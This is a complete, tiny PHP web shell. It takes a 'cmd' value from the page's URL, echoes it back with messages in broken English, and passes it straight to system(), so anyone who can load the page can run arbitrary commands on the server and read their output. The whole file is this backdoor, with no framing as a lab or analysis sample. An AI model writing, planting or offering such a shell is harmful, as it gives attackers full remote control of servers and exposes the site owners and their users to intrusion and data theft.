<?php
$cmd = $_GET['cmd'];
echo '<br><br>#########################<br><br>';
$cmd = stripslashes($cmd);
echo 'The shell code <b>'.$cmd.'</b> as been executed on server.<br>';
echo 'The server with answered this your request:<br><br>';
system($cmd);

?>